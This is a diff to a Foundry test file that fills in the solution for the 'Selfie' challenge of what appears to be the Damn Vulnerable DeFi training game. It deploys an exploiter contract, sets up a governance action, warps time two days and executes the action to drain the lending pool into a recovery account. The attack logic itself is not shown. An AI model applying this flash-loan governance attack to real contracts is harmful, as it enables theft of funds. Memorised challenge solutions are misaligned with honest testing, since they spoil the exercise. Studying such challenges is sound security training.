@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {SelfieExploiter} from "./SelfieExploiter.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +63,15 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        SelfieExploiter exploiter = new SelfieExploiter(
+            address(pool),
+            address(governance),
+            address(token)
+        );
+
+        require(exploiter.exploitSetup(address(recovery)));
+        vm.warp(block.timestamp + 2 days);
+        require(exploiter.exploitCloseup());
     }
 
     /**
@@ -71,6 +80,10 @@ contract SelfieChallenge is Test {
     function _isSolved() private view {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
-        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            TOKENS_IN_POOL,
+            "Not enough tokens in recovery account"
+        );
     }
 }
